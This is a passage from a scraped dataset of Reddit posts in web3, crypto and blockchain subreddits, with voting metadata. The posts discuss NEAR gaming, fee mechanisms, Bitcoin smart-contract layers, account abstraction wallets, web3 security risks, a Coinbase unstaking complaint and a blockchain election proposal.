and gas fee issues, they are leaving ethereum. for example, that horse racing game that went viral on tiktok, zed, has completed its move over to near. more importantly, near has been investing in gaming for a while now. gaming platform developers op games, inite and vorto gaming have all received 6 figure grants from near. it was the place to be for gaming in 2021 and should continue to be into 2022.",30,13,0.9,2022-01-28 15:02:32,web3,web3,Mediocre-Series4505,False,32.2

Transaction Fee Mechanism Design - Optimality is Provably Possible,"**there are a growing number of papers in eth research circles that claim it is impossible to build a socially optimal transaction fee mechanism. the working paper linked at the address below proves this is wrong - it is achievable.** [https://saito.tech/socially-optimal-transaction-fee-mechanism-design/](https://saito.tech/socially-optimal-transaction-fee-mechanism-design/) **sharing here because although the paper is somewhat academic the proof itself is less than 2 pages and should be accessible to anyone with undergraduate economics. it uses the equation for the ""utility possibility frontier"" developed by paul samuelson and leonid hurwicz in their nobel-winning work on optimality of public goods provision.** **there are two reasons this matters for ethereum. the first is that it shows that unless a fee mechanism is pareto optimal it can never be incentive compatible, as otherwise there will always be a coalition of participants who can improve their utility by adopting the ""byzantine"" strategy of paying a different fee. this is worth noticing because the papers that claim this is an impossible problem to solve are proposing modifications to the fee design that make it impossible to achieve pareto optimality, which means they don't understand the underlying problem. having more people understand the underlying problem is the best way to provide pushback against bad ideas getting traction.** **the second reason is that the paper proves there is a very specific technical property that needs to exist for optimality to happen -- block producers must be incentivized to share unconfirmed and fee-bearing transactions with their peers.** **there is a lot of research being done on improving the ability for nodes to increase their profits from hoarding transactions, such as optimizing mev. a lot of the time this is being done under the guise of ""funding infrastructure"" but it is harmful for the network.**",32,9,0.94,2024-07-19 02:47:39,web3,ethereum,trevelyan22,False,32.2

"If crypto is decentralized, how can a network be updated?","hey people! i've had this question for a while, there are probably some wrong assumptions here so please bare with me, and correct me if i'm wrong. so my underatanding is this: the idea of crypto is to exist on a blockchain, which is maintained by a network of computers. each computer provides its individual confirmation for a given transaction, and so as more computing power in the network, the more unrealistic it is for an individual to manipulate transactions on the ledger, as it would require this individual (or group) to have more than 50% of the network's computing power. which means this is a form of a decentralized machine which no one has control over, by design. in that case, how come many (already online) cryptos networks are in active development? how come this decentralized beast can just be modified and updated? and if the team behind a certain crypto can just release updates to it, doesn't that imply that they could also shut it off?",24,23,0.83,2024-01-01 17:56:20,web3,CryptoTechnology,Sweeneysmithy,False,31.9

Is the risk-reward balance enough for joining Web3 projects right now?,"even though web3 is a vast and high potential trend, sometimes it feels like is taking too long for the engines to start. i started my web3 journey with a helium hotspot in my house and received good money due to its proof of coverage mechanism. even though helium-compatible iot applications are being developed, it seems like something is still holding iot back. the major points seem to be related to security and high data consumption. on the other hand, any company can use hotspot technology (since it’s open source) to produce and sell it. freedomfi is developing a 5g router for it, but i’m not sure if this can boost iot adoption. (5g is faster, but the signal is short and easily interrupted.) it looks like the same is happening with oracles’ projects. much of the defi industry was built on data feeds procured by oracles, mainly by the top5 link, band, aeternity, dos network and diadata. the main driver for me is the possibility of global industries entering the smart contract ecosystem. the use of smart contracts can also be embraced by other industries beyond defi . if this happens, millions of assets will have to be connected to the blockchain to use smart contracts. on the other hand, if this doesn’t materialize… then i can’t see much upside ahead. 1. what are your thoughts? is the risk/reward balance enough to join web3 right now? 2. is there any specific web3-related project where future rewards compensate for the current risk?

Supercharging Bitcoin with Smart Contracts,"the crypto space has been evolving rapidly, and it's evident that many people are becoming interested in blockchain technology, particularly in bitcoin and its potential for improvement, especially regarding its main chain. i want to share a protocol known as satschain, which aims to enhance bitcoin's capabilities. if you're involved in bitcoin and blockchain, this protocol is worth knowing about. what is satschain? it is an innovative execution protocol designed to bring smart contract capabilities to bitcoin, making it turing complete. this means bitcoin can now handle complex computations and smart contracts, similar to what ethereum does but with bitcoin's robust security. here are some reasons why it is innovative: * trustless execution: executes smart contracts securely on bitcoin's main chain. * btc as gas: uses bitcoin for transactions and smart contracts, no new tokens needed. * modular design: easily integrates with existing systems and scales for the future. * enhances layer 2: improves functionality for layer 2 solutions integrating with satschain. * evm compatibility: supports ethereum virtual machine, simplifying dapp migration to bitcoin. * smart contracts: introduces ethereum-like smart contracts to bitcoin for decentralized applications (dapps) and defi. * native btc utility: increases bitcoin's utility beyond store of value. * bitcoin's security: maintains bitcoin's robust security and decentralization. the heart of satschain is the nuclei engine, which has four main components: interface layer networking layer execution layer storage layer why is this important? for developers: easily expand your ethereum projects to bitcoin and leverage its security. for users: enjoy more functionality with bitcoin, like defi and dapps. for the community: strengthens bitcoin’s position as a leading blockchain by enhancing its capabilities. satschain isn't just another solution; it's a protocol that enhances bitcoin itself. if successful, it could significantly enhance the bitcoin ecosystem, making it more versatile and powerful.",23,20,0.97,2024-06-19 06:43:18,web3,BlockchainStartups,oracleifi,False,31.499999999999996

Expanding Bitcoin’s Use Cases with EVM Compatibility,"i've been exploring the developments in bitcoin's l2 ecosystem, and the integration of evm compatibility seems like a significant step forward. this integration could expand bitcoin's use cases by allowing devs to create a wide range of dapps that leverage bitcoin's liquidity and security. here are some key players i've come across: bob: this is noted as the first bitcoin l2 with full evm compatibility and native bitcoin support, aiming to empower innovation on bitcoin. rootstock: a sidechain that introduces smart contracts to bitcoin, enabling more complex transactions and applications. stacks: utilizes microblocks and a proof-of-transfer mechanism to enable smart contracts and dapps on bitcoin. liquid network: a sidechain designed for fast and secure asset transfers, also supporting token issuance. bevm: a fully evm-compatible, decentralized scaling solution with a growing defi ecosystem. from my observations, l2s leveraging bitcoin's main chain security is a challenge because it requires complex mechanisms to securely and efficiently integrate their operations with bitcoin’s highly secure but limited scripting capabilities. protocols like satzlabs are reportedly working on foundations for better l2 infrastructure on bitcoin. l2 networks will be able to use its tech stack, including programmable anchoring on base-chain bitcoin, which could help take their development further. i'm curious to see how these advancements will impact the bitcoin ecosystem.",24,17,0.97,2024-08-06 04:49:27,web3,BlockchainStartups,tsurutatdk,False,30.9

Celebrating 9 years of Ethereum progress 🥳,"today, we celebrate the revolutionary blockchain platform that has revolutionized decentralized applications (dapps) and finance (defi). let’s take a look at the biggest ethereum moments so far: 1. in 2017, the byzantium fork not only reduced the block reward from 5 eth to 3 eth but also introduced new technology that made it easier for other blockchains to build on ethereum. this was a game-changing moment, fueling ethereum's vision of a decentralized web. 2. later in 2017, the nft game cryptokitties became a sensation, causing record-high activity on the ethereum blockchain. this event highlighted the growing interest in nfts and showcased the need for ethereum's speed and scalability improvements. 3. fast forward to 2019: the istanbul and constantinople upgrades optimized ethereum's gas fee structure, leading to more efficient transactions. they also laid the groundwork for the transition to a proof of stake (pos) consensus mechanism, signaling a future of greater scalability and security. 4. in 2020, ethereum introduced the beacon chain, a pos blockchain that promised a new era for ethereum. the beacon chain was a crucial step towards ending ethereum's reliance on pow mining, setting the stage for the transformative merge event. 5. 2022 marked a historic moment: the merge. ethereum successfully transitioned to a pos blockchain, slashing its carbon footprint and changing its daily issuance. this was more than just an upgrade - it was a paradigm shift, establishing ethereum as an eco-friendly blockchain in the eyes of many. 6. in 2023, the shanghai upgrade focused on enhancing the network's functionality. the most notable feature enabled users to unlock and withdraw their staked eth, which addressed a critical aspect of user control and liquidity in the ethereum ecosystem. 7. now in 2024, the anticipated approval of ethereum etfs marked a milestone in mainstream financial markets, providing new investment opportunities. what, in your opinion, has been the biggest ethereum achievement so far? https://preview.redd.it/vuskt130ulfd1.png?width=4000&format=png&auto=webp&s=be0c1d6cbd0e0d4f2cc26da2546bb142413a1b80",35,1,0.93,2024-07-30 03:09:50,web3,ethereum,CoinGate,False,30.7

Account Abstraction Wallet is evolving so fast in terms of development and Innovation.,"defi has always been in an ever-evolving landscape with the sole aim of enhancing the user experience, seamless transition and onboarding, security, and privacy. based on my research, i'd say one of the key areas in this field is account abstraction. there has been a drastic shift and development in this area, scaling from the traditional wallet system we know to a more user-centric solution that has a lot of benefits for web3 users and also for web2 users that want to venture into web3. what exactly is account abstraction? account abstraction is a methodology that can be applied to blockchain accounts to usher in greater adaptability, diversity, and security for users. this is achieved by harnessing the power of smart contract accounts, which offer advantages to externally owned accounts (eoas). . this was initially introduced by ethereum co-founder vitalik buterin and has gained widespread recognition and substantial community support, particularly through erc-4337. it is currently regarded as a cutting-edge trend within the blockchain. here are a few wallets currently implementing account abstraction: 1. argent argent is a user-friendly smart contract wallet emphasizing layer 2 activities, tailored for cryptocurrency newcomers. it boasts social recovery, multi-signature capabilities, fee payments in stablecoins, and rapid batch transactions. currently active on ethereum mainnet and layer 2 solutions like zksync and starknet. 2. ambire ambire wallet prioritizes user friendliness and security, serving both new and experienced users. it stands out with advanced features like batch transactions, multi-signature capabilities, and stablecoin fee payments across various blockchains. their gas tank feature enables cost-effective transactions in preferred tokens. 3. brillion this boasts a multitude of advanced features, such as the utilization of social logins, seamless bank integration, intermediary-free remittance payments, flexible withdrawals, and spending limits. it'll support the utilization of ssi offered by nexeraid, empower users to recover identities through metanfts, establish rules for diverse wallet activities, embed compliance measures, and much more. but it is still in the open beta phase. there are many others, like holdstation, sequence, safe, bitkey, bit gate, and many more. even metamask, from the look of things, is scaling to this type of wallet. from my research, i think all seem to have the same end goal or object, and all features are centered on enhancing the benefit, which is to simplify and enhance the user experience, enhanced security and privacy, cost efficiency, interoperability, and future-proofing. i think aa's ability to increase flexibility, interoperability, and user-friendliness opens the door to a multitude of innovative applications in web 3.",31,4,1.0,2023-11-08 04:30:40,web3,web3,oracleifi,False,30.2

The Blockchain Industry Needs Cyber Security Solutions,"the blockchain and cryptocurrency space were subjected to a gauntlet like no other in 2022. from the terra implosion, celsius explosion, and ftx bombshell investors and enthusiasts are eyeing the space with newfound skepticism. a consensus is fast-emerging that the space requires better regulation, security, and transparency if it will remain mainstream and viable in the future. one potential response to this soul-searching is to look for interdisciplinary solutions. today, lets turn our attention to what cyber security–and specifically confidential computing, or the protection of data in transit–has to offer the reeling blockchain industry. in a nutshell,tthe integration of cybersecurity and blockchain technology has the potential to revolutionize the way we secure and protect sensitive data in a variety of industries. as the use of blockchain technology continues to expand, it is crucial that we find ways to address the vulnerabilities that come with it. this is where cybersecurity companies come in. one area where cybersecurity companies are helping to make the blockchain space more secure is in the protection of hot wallets. hot wallets, which are digital wallets that are connected to the internet, are used to store, send, and receive digital assets such as cryptocurrencies. these wallets are at a higher risk of being hacked or compromised compared to cold wallets, which are not connected to the internet and are used to store digital assets more securely. cybersecurity companies such as intel, hub security, and fortanix are working with blockchain companies to develop more sophisticated protections for hot wallets, such as multi-factor authentication, encryption, and other security measures. another way that cybersecurity companies are helping to secure the blockchain space is by focusing on the infrastructure of blockchain networks. for example, crypsis is a cybersecurity company that provides solutions for centralized crypto exchanges to secure their networks and protect against attacks. the company offers a range of services, including incident response, vulnerability management, and penetration testing, all of which are designed to identify and address potential vulnerabilities in blockchain-based systems. in addition to securing the infrastructure of blockchain networks, cybersecurity companies are also developing tools and technologies to detect and prevent attacks on these systems. for example, hub security is working on confidential computing solutions that allow organizations to securely process sensitive data on the blockchain without the risk of it being compromised. this is particularly useful for industries such as finance, where the protection of sensitive data is of the utmost importance. overall, the integration of cybersecurity and blockchain technology has the potential to make the blockchain space more secure and transparent. by working together, cybersecurity companies and blockchain companies can find innovative ways to address the vulnerabilities that come with this technology and create a safer environment for all stakeholders. this is just one way to help the space as a whole regain confidence in its trajectory and lt viability.",29,8,0.96,2023-01-08 03:55:13,web3,BlockchainStartups,EagleEyeStx,False,30.199999999999996

Is blockchain real estate going to be the next big thing?,"is blockchain real-estate next big thing? let’s discuss blockchain can be used to transfer the purchase price for real estate transactions using established cryptocurrencies, as well as through initial coin offerings (tokenization). one of the greatest benefits of blockchain technology in real estate transactions is that it allows for a more secure ledger system for positions throughout the capital stack. this is likely to result in enhanced connectivity, single-platform integration, and faster transaction timelines. blockchain is likely to unlock liquidity in real estate, which is historically a relatively illiquid asset. real estate investors would be able to quickly and easily sell their commercial real estate positions in the open market. barriers to entry are also likely to be reduced for investors seeking to invest directly in real estate. a secondary market on a blockchain platform would create a much more efficient market for real estate because real estate assets could be freely and transparently traded. real property value is determined in numerous ways, including through: • the sales comparison approach • the capitalization rate model • the income approach • the cost approach. with a blockchain-based secondary market, real estate assets could be priced in real time based on the most current trading information available to investors. there are many projects such as landshareio, nytrealestate, rebny that brings real estate to the blockchain. i would like to discuss landshare that aims to bring the real estate to the blockchain. it offers a hassle-free alternative to traditional real estate investments. what makes landshare unique is that instead of incorporating unsustainably high apy rates, our platform returns yields based on the value of real estate assets and the rental profits they can generate. landshare allows investors to participate indirectly in the real estate market, without having to worry about maintenance, taxes, tokenized ownership, or property depreciation.",30,5,0.98,2021-09-28 18:41:56,web3,BlockchainStartups,Wolf_Joe,False,29.8

Have you heard of WASM? It means a LOT for WEB3 Development.,"webassembly, often referred to as wasm, is a relatively new type of portable binary-code format, capable of running on modern browsers efficiently. the original goal of webassembly was to enable high-performance applications on web pages. wasm doesn't provide any web-specific features, so it can be used for blockchain and smart contract development, too. in the blockchain development space, wasm is often referred to as ethereum virtual machine — evm’s predecessor. computationally, evm is not sustainable from an energetic standpoint. in spite of the fact that it has been designed to be as efficient as possible, it still has some flaws that make it inefficient in comparison to its competitors, such as polkadot, near, solana, or cosmos. why should i choose wasm over evm ? fast, efficient and portable, with near-native speed, wasm’s promise is the capability to outperform evm as a virtual machine for blockchains: • high performance: wasm enables high performance — it’s built to be as close to native machine code as possible while still being platform-independent. • small size: wasm produces small-sized binary files. this is a great fit for the blockchain world as smaller binaries result in lighter transaction data and therefore save gas fees. • general vm & bytecode: wasm was developed to be deployed in any browser producing the same result. evm on the contrary was developed for a specific use case. this has resulted in more teams using wasm for different purposes and generating a wide variety of tools and resources. • tooling and support: as mentioned above, the community is creating tools and resources for wasm available to developers. • efficient jit execution: wasm natively supports 64 and 32-bit integer operations. this comes in handy when performing 64-bit operations because there is no need to decompose them into 32-bit and emulate instructions. instead, wasm provides all numeric instructions with 64-bit support that map one-to-one with the cpu instructions. in order to work with and unlock the full potential of wasm native dapps, web3 tools written in wasm must be leveraged. therefore, infrastructure providers are required to redeploy their services in wasm to be able to be integrated with wasm smart contracts. dia identified this issue early on and deployed its open-source oracle infrastructure on the shiden network. shiden network is the first live parachain in the kusama network natively offering, alongside evm, smart support for wasm smart contracts. by leveraging dia’s wasm-based oracles, dapps on shiden can connect their wasm-based smart contracts to ingest data feeds on-chain to enable a variety of use cases such as on-chain lending and borrowing, staking, options, stablecoins and many more.",19,25,0.83,2022-11-03 18:13:56,web3,web3,MakeItRelevant,False,29.699999999999996

Change my mind on Web3.,"i personally think that web3 is an incredible idea and concept that could revolutionize the way we use the internet. but to me, that's where it ends - as a great idea and concept. decentralization is something that would leave a profoundly positive impact on society, but i don't think it's something that could ever break into the mainstream. i thought earlier this year that the nft boom was going to be something that motivates people to educate themselves on web3 - it's been a full year since it gathered all this notoriety and people just see the space as a joke. even the people that are heavily involved in the scene just talk about web3 being the future on twitter to sound smart. you would think that if they truly believed in web3 and decentralization, they would adopt and promote new, decentralized social media like mastodon and aether to their peers and followers. another point: the fact that facebook continuously exploits and misleads its users should be enough alone for everyone using it to jump ship - but they don't. people just don't value their privacy anymore, even with mainstream resources available like the documentary ""the social dilemma"", they still don't care. am i missing anything substantial? the last thing i want to do is be closed-minded about this - i just feel like it's such a stretch that web3 is inevitable like everyone is saying. i think that it would take a full cultural reset and even the extinction of capitalism to transition from web2 to web3.",22,16,1.0,2021-11-01 20:50:49,web3,web3,AnonymousGuest,False,29.6

"Is Web 3.0 overhyped or the next big thing? Is it a genuine step into the future, or is it just a gimmick?","the goal of web3 is to bring physical assets into the digital age and allow true digital ownership. people who claim that big tech won't allow it are probably correct, but what about a new start-up that uses crypto to give people true ownership of the content they create? if big tech doesn't adopt it, how can it compete? is there any interest in it? i'm not sure, but it appears that crypto enthusiasts do. it will be interesting to see if it is useful to the general public. i have a hard time believing that web2.0 users who have grown accustomed to ""free"" services will be willing to pay for web3 services. benefits such as privacy and ownership are not valued by the average person. the exceptions are financial dapps, where usage is expected to generate a profit, dapps that compete with high-fee apps, and dapps that distribute earnings to users. if you want to know where the next big ideas will come from, look where the money and smart developers are going, has always been a truism in silicon valley. in the case of web3, there has been no shortage of funds. on the other hand, only a few developers have decided to join the bandwagon. tea is a web 3 tool developed by a group of well-known developers, including those behind the homebrew tool. smart contracts allow for code-enforced contracts. blockchain technology can be used to own digital assets. this is a game changer in the financial world. i'll use gaming assets as an example so that people can understand what i'm talking about. you can work hard for items in a wow game, putting in a lot of time and effort, but you'll be out of luck if blizzard decides to ban your account for no apparent reason. you have no legal claim to them. you can truly own these items thanks to the blockchain. they will not be taken away from you by blizzard. there are even assets on the blockchain that can be used in a variety of games. we continue to use our phones as computers and our computers as phones despite this. i mostly trust developers in this process because they have a good understanding of the game. web3 will make the internet more equitable by allowing individuals to be sovereign. to be truly sovereign, one must have control over one's time and information, as well as who benefits from it. web 3 developers such as max howell, the creator of homebrew, are working on a new project called tea for web 3. what are your thoughts on this?",29,8,0.9,2022-04-19 15:58:58,web3,web3,chunzitdhfgd,False,29.599999999999998

Unstaking delayed on SOL since 10-31-2024 - update and info leak ,"sorry for the long post in advance… but here’s an update. i managed to meet one of the people on the technical team that is aware of the problem. this person is not working directly on it though but has a good idea of what's going on. so, from what i understood. the issue started with a massive unstake request 5 days before the us presidential election, at the same time as some issues with the solana network, i.e., whilst it was also congested. this did not cause any other staking service or platform any prolonged issues, except for coinbase. this level of network disruption is normally fine, as the unstake would be pushed down to the next epoch in different batches and released. but, something on coinbase’s side went wrong and unstaking was frozen, this could have been an issue with the coinbase validator. i.e. causing a technical bottleneck in their own staking service aggregated by the sudden spike in demand. since the validator operations didnt sync properly with the sol network and their batch processing system failed, unstake requests became stuck and a massive backlog was caused. as this was off the back of the start of this massive bull run - management decided to sideline it and focus all the energy on profiteering and ensuring other systems (e.g. trading, futures) run smoothly, as they make them money. they had a small team focus on it and tried running a manual review process for large withdrawals whilst some system errors persisted, however, this means they were only processing small unstake requests whilst the bigger ones in the batch from 10-31-2024 are sitting in limbo. so, many of the users that had their small sol amounts unstake normally were part of this process. the engineer has said this is definitely a coinbase specific issue and is not tied up to sol’s blockchain, rather it is more of an internal glitch that they are unable to resolve which is also coupled with a capacity problem. the engineer said they need to fix the glitch and run a few test runs to ensure the sol is not lost forever, so this will add to the delay significantly, and they are not even at that point yet. apparently, this glitch has never happened to this extent and is quite serious, management have asked technical teams and support to keep it quiet and ensure no updates or details are released, and that no detailed responses or information is leaked as it is now classified as 'technical negligence' and makes coinbase fully liable… meaning, if users sue them then they are in a position to win and have coinbase pay off a lot of money. he also said, because they are not willing to publicly address this issue or admit to it, it puts them in a worse position than if they addressed it immediately, as it creates a second level of negligence and known fault, whilst holding users money. also, an important point the engineer raised was this was not made a priority initially as coinbase was heavily benefiting from the bull run, and put all its resources on that instead. now, management is panicking because they are still unable to resolve this, and are worried news might get out, causing users to lose trust in coinbase. i have basically begged this engineer to sneak me some more intel and any email exchanges as evidence all of us can use to address this in court if the time comes… lets see if i can manage that. would appreciate if anyone else can come forward regarding this issue too.",11,37,0.79,2024-11-16 19:44:24,web3,solana,Decent-Government-51,False,29.299999999999997

The Rise Of Web3: What Cybersecurity Concerns Should We Look Out For?,"web3 is a slang name for the future generation of the internet, which includes cryptocurrency, decentralized networks, the blockchain, and other technologies. while the concept of web3 may appear to many as a far-off, future concept, the truth is that it is far closer than we realize, with many features already firmly embedded in the public awareness. central bank digital currencies (cbdc)—virtual money backed and issued by a central bank—have previously been created in nine nations. what concerns should we look for? cryptojacking it doesn't take long for cybercriminals to jump on the bandwagon, as it does with all popular trends. rav researchers revealed 2021 was ""the year of the miner"" in reason labs' state of consumer cybersecurity report. the number of crypto miners distributed throughout 2021 was enormous, accounting for nearly 60% of all trojan activity detected last year. it's a threat that, while it may not harm a user's device like traditional malware, will directly affect a user's pocketbook—your electric bill may skyrocket as crypto coins are harvested without your consent. projects like concordium have paved the way by ensuring that while users enjoy safety and privacy of transactions, it is possible to be used for police report when the need be. vulnerabilities in blockchain there are legitimate security concerns with digital currency. the cryptocurrency blockchain, contrary to popular belief, is not an impenetrable force. it is secure when you or trusted sources operate the majority of a blockchain. however, if malicious miners control a simple majority of more than 51 percent of the blockchain, it breaks the chain, making it vulnerable to manipulation—and, worryingly, these so-called ""51 percent attacks"" are also on the rise. in 2020, bitcoin gold, a relatively minor cryptocurrency, was subjected to a 51 percent attack, resulting in the double-spending of over $72,000 in bitcoin gold tokens. and, just last month, the play-to-earn crypto game axie infinity was hacked to the tune of $625 million by hackers stealing from the underlying ronin blockchain, raising the bar for crypto heists to shockingly high new heights many in the cybersecurity industry would consider an event like this to be a learning experience, but it's a costly one! phishing attacks phishing is another threat that is likely to infiltrate the web3 domain. phishing is not a new concept; however, the way it is used today is. in october 2021, attackers used phishing emails to steal cryptocurrency from 6,000 coinbase customer accounts by exploiting a flaw in the company's two-factor sms system. another malicious example of this type of theft occurred in february, when $1.7 million in non-fungible tokens (nfts) were stolen in an opensea phishing attack. an attack that exploited a flaw in the wyvern protocol, the standard that underpins most nfts, stole over 250 tokens. the importance of education this brings us back to a topic i've discussed before: the importance of cybersecurity education. how do you prevent phishing scams? what exactly does it mean to be cyber secure? how do you have complete faith in something? it is critical to teach customers how to ask and answer these questions. learning to recognize suspicious signs will increase consumer awareness of the safety of their devices and data. furthermore, next-generation antivirus (ngav) and endpoint protection solutions are required. attackers are constantly attempting to tip the scales of trust. to detect and eliminate new threats, we need to use a combination of the human brain, instinct, and ai machine learning. unfortunately, the “freedom” and end-user ownership that web3 will offer consumers is the same freedom that cybercriminals will also be able to enjoy. we need to find a solution whereby the vision of an autonomous web for all can be experienced, without opening up a huge can of worms.",30,6,0.88,2022-05-30 16:44:15,web3,web3,Aggrgis,False,29.2

Addressing Challenges for Online Merchants,"cryptocurrencies have captured the world's attention, revolutionizing the way we transact. bitcoin, ethereum, doge and litecoin are just a few examples of digital currencies that have gained popularity for their versatility in purchasing anything from everyday items to real estate. as the use of cryptocurrency in e-commerce continues to surge, driven by the robust security provided by blockchain technology, online merchants face a unique challenge. the dilemma arises when online merchants accept crypto payments but still need to pay their employees and suppliers in traditional fiat currencies (usd/eur). converting crypto payments into fiat currencies adds an additional layer of complexity, time, and costs, often outweighing the perceived benefits of accepting crypto. among the pain points experienced by online merchants, concerns about the safety of crypto and lengthy payout processes take center stage. merchants worry about potential fund loss, as traditional banks offer a higher level of guarantee compared to crypto payment services. despite the financial crisis being a decade behind us, reports of lost crypto funds still surface intermittently, contributing to lingering apprehension among businesses. additionally, delays in receiving fiat funds due to convoluted payment procedures further compound the frustrations faced by merchants. however, the good news is that innovative solutions are emerging to tackle these challenges head-on through seamless fiat conversions, enhanced buyer protection, and streamlined payout processes. some crypto payment platforms are now bridging the gap between web2 and web3. as the cryptocurrency ecosystem evolves, the potential of payment gateway solutions to facilitate broader crypto acceptance among online businesses becomes evident. notable platforms such as shopify, alternative airlines, guess, and shopify have already embraced crypto payment method, with more platforms expected to follow suit. what are your thoughts on the obstacles faced by online businesses in accepting crypto? how do you perceive the potential of payment gateway solutions in overcoming these challenges?",23,15,0.93,2023-05-25 07:32:31,web3,web3,avenircompop3,False,29.099999999999998

Web3 business model,"i was reading an [article](https://www.jonstokes.com/p/web3-the-rise-of-the-aligned-web) and a fundamental question about web3 came to my mind. i want to make this question clear with an example: **web2:** alice and bob want to text each other on a social media page, they decide on facebook and start to text each other. the app on which the two text is facebook, the underlying infrastructure are the facebook servers. we all know how facebook makes its money, so the elements of revenue are the users’ data and the payments from the ad providers. in the end, the ad providers are the ones who pay directly for the servers and the users are paying indirectly with their data. this is a simplified version of how the servers get financed (advertisement business model) **web3:** alice and bob want to text each other on a social media page, they decide on *dappxyz* and start to text each other. the app on which the two text is *dappxyz*, the underlying infrastructure is the ethereum blockchain. but what are the elements of revenue? we know the ethereum blockchain gets maintained through the miners who are getting rewarded by tx fees and protocol rewards and these come from the users who make transactions. how would this model work with a social media dapp? someone must pay the miners (stakers in the future). is there going to be a tx fee for every message or every week in form of a smart contract? in web2 we have the infamous advertisement business model, what business model does web3 have? i fully sympathize with the core ideas of web3, and i'm interested but this is a fundamental concept that is not clear for me. would love it if somebody could point out my errors or help me in some way! cheers.",21,15,1.0,2021-12-29 18:05:55,web3,web3,usualSputnik,False,28.6

Questions about the modified merkle patricia tree,"i am trying to fully understand the modified merkle patricia tree used in ethereum. i have been reading the yellow paper and tried to consult google, but there are still some things i don’t understand. 1. in the yellow paper it says that for branch nodes “the 17th item is used in the case of this being a terminator node and thus a key being ended at this point in its traversal.” - if all keys have the same length, how would this ever be the case? is this tree structure used anywhere where the keys are not guaranteed to have the same length? 2. i don’t understand how to structure an extension node. the formal definition seems circular to me, as c(j, i) depends on n(j, i) in the case of an extension node, but n(j, i) depends on c(j, i) for all cases where j is not empty. what am i missing here? 3. i don’t understand how the root hash is actually calculated, but i think this might be related to my question above. the way i understand (213) in the yellow paper, the root hash is calculated as the keccak256 hash of the rlp-serialisation of the structural composition of the root node. but how does the structural composition of the root node depend on the tree in such a way that any change below invalidates is?",31,1,0.96,2023-12-26 15:09:48,web3,ethereum,Appropriate_Tell4261,False,28.599999999999994

The solution to restaking problems?,"restaking began as a capital-efficient way to extend the decentralized trust of ethereum's crypto-economic security to avss on ethereum. but the current state of restaking still falls short of solving the core problem that blockchains are fragmented trust networks and also introduces a few new problems. as a solution, exocore introduces #omnichain restaking, which has ⤵️ 1️⃣ pooled security 2️⃣ decentralized governance 3️⃣ reduced smart contract risk 🛡️ pooled security instead of siloing decentralized security on a single chain (single-player mode), exocore's omnichain model aggregates the crypto-economic security across multiple chains (massive multiplayer mode) to secure off-chain actively validated services (avss) such as bridges, oracles, rpc infra, modular components and more. 🗳️ decentralized governance instead of a centralized model of governance via multi-sig, exocore is an l1 for restaking, run by a decentralized network of validators. exocore's decentralized architecture will drive community governance and ownership. an open market for decentralized trust should be built with decentralized governance. ⛓️ reduced smart contract risk instead of implementing all of the complex restaking logic within the smart contract layer, exocore handles the complexity of the staking logic at the protocol level. by minimizing the logic needed on smart contracts, exocore reduces the risk of smart contract vulnerabilities. in summary, exocore's omnichain #restaking model pools crypto-economic security across multiple chains, makes restaking more decentralized, and reduces smart contract risk. this results in a new paradigm to extend decentralized trust everywhere.",22,16,0.89,2024-08-08 11:49:15,web3,defi,silverchai,False,28.5

Decentralized E-Commerce Marketplace Vows to Offer Shopping Protection and Data Security,"a new blockchain-based e-commerce marketplace claims its centralized rivals are harming the sector by overcharging buyers and unfairly treating merchants — and plans to launch a new model, offering “complete shopping protection, data security and minimal commission.” **apollox** says it is hoping to challenge “monopolistic intermediaries” with an ecosystem consisting of three building blocks. the first component is a protocol which the company says makes it easy for e-retailers to build decentralized e-commerce applications on a blockchain. the second block is the independent web stores and marketplaces that will be developed using its technology. last but not least, apollox says that the third block is the whole of its community — including manufacturers, service providers, technologists, sellers and consumers — with users being rewarded when they provide value to other stakeholders. the company alleges that the dominance of big industry players has sparked massive issues. apollox claims that unfair pricing, hidden costs, data abuse and the misuse of power are byproducts of e-commerce giants pursuing ways to maximize their profits. as an antidote to this, the blockchain-driven startup says it wants to decrease the costs associated with e-commerce by 40 percent. let's connect and get the latest updates on https://apollox.network/",32,4,0.76,2018-09-24 04:10:12,web3,BlockchainStartups,gwen_sarah1,False,28.4

How to make Blockchain based elections possible? A concept ...,"**abstract** so i've seen a couple articles and posts about the general concept of blockchain voting but there has always been critique saying ""it cannot be done"" due to e.g. lost/hacked wallet access, majority of people not understanding crypto, etc. i would like to present a process that would address these and is in my eyes a viable and simple solution. &#x200b; **requirements / goals** 1. cryptographically ensure correct election outcome. 2. enable checking of correct vote counting by every individual, ie ""i can verify that my vote ended up in the party's wallet after election"". 3. privacy: nobody, not even the government knows the identity behind addresses 4. ease of use: similar process to current election registration in government offices. should not rely on voter's capability of using/owning technology 5. cost: present overall cheaper solution to nation-scale election process as manual counting/paper voting. &#x200b; **blockchain** on the technology side, let's take basic btc as a starting point. so everybody can generate an empty wallet address, transactions cost fees and there need to be miners. extensions like lightning are not necessary here. what needs to be done to make this viable for vorting? 1. removal of transaction fees. all transactions (ie votes) are of equal priority. 2. no mining rewards, people would volunteer to run miners alongside miners run by government. 3. blocktime reduced to e.g. <1min to support faster processing during elections. higher temporal resolution. plus increase of blocksize. 4. after an election, all miners can go offline, halting the progress of the chain. until the next election comes up --> blockchain growth only during election phases. 5. single, publicly know wallet address for government, under government control. used to distribute voting rights prior to election. can be accessed by central government authority only. 6. local blockchain wallet running on mobile phone stores received voting tokens until used. no further modifications to the protocol need to be done. &#x200b; **social process** so how does this enable us to vote? take the following steps as a foundation: *prio to election, voter registration* 1. just before every election, no wallets are funded and no votes are available in public. local town halls need to be seed-funded. all tokens reside in central government wallet. 2. mayors apply to receive a large enough amount of tokens from the central government to their wallet. town hall wallet address is published in local newspaper for local community to see. address must be regenerated for every election. citizens can see how many tokens are transferred to each town hall / mayor's office. 3. citizens go to local town hall and register for election by presenting their id. desk worker #1 checks id and ensures citizen does not try to double vote. issues a signed, stamped paper note to citizen confirming eligibility to vote. 4. citizen goes to next desk, present paper note. here citizen takes out wallet app and generates a new wallet address. shows qr code to desk worker together with note. desk worker then transfers one token to citizen's wallet. paper note is handed in and destroyed. 5. anonymous, secure funding of citizen wallets complete. *during election* 1. every party publishes their wallet address. 2. government and volunteering citizens start up blockchain miners, running e.g. sha-256 mining, just like btc (see above). 3. citizens use their voting app to send their token to desired party's address. 4. citizens who do not own a mobile phone can borrow one from local town hall for this election. then register their vote prior to election day send their vote off immediately. they will keep a paper copy of their wallet address for later verification. address is not disclosed to anyone. *after election* 1. after all issued tokens have been sent or after a timeout/grace period, final results are immediately visible by inspecting party wallet addresses. 2. every citizen can use their app / paper copy of own wallet address to open blockchain explorer and verify successful transaction of own token to desired party. 3. as own wallet address is not 